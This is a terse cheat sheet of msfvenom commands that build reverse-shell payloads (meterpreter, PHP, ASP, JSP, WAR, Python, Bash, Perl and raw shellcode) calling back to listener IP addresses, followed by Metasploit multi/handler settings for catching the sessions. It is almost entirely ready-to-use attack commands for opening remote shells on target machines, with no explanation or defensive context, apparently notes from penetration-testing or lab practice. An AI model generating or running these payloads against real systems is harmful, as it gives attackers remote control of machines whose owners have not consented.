# MSFVenom Shells

- Linux
→ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.49.163 LPORT=443 -f elf > shell.elf

- Windows
→ msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.236 LPORT=443 -f exe > shell.exe

- PHP
→ msfvenom -p php/reverse_php LHOST=10.11.0.236 LPORT=443 -f raw > shell.php
→ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.236 LPORT=443 -f raw > shell.php
→ cat shell.php | pbcopy && echo ‘<?php ’ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php

- ASP
→ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.236 LPORT=443 -f asp > shell.asp

- JSP
→ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.236 LPORT=443 -f raw > shell.jsp

- WAR
→ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.236 LPORT=443 -f war > shell.war

Scripting Payloads:

- Python
→ msfvenom -p cmd/unix/reverse_python LHOST=192.168.49.163 LPORT=2222 -f raw > shell.py

- Bash
→ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.163 LPORT=443 -f raw > shell.sh

- Perl
→ msfvenom -p cmd/unix/reverse_perl LHOST=10.11.0.236 LPORT=443 -f raw > shell.pl

Msfvenom Shellcode:

- Linux Based Shellcode
→ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.236 LPORT=443 -f <language>

- Windows Based Shellcode
→ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.236 LPORT=443 -f <language>

Metasploit Multihandler:
- exploit/multi/handler
- set PAYLOAD windows/meterpreter/reverse_tcp
- set LHOST 0.0.0.0
- set LPORT 000
- set ExitOnSession false
- exploit -j -z
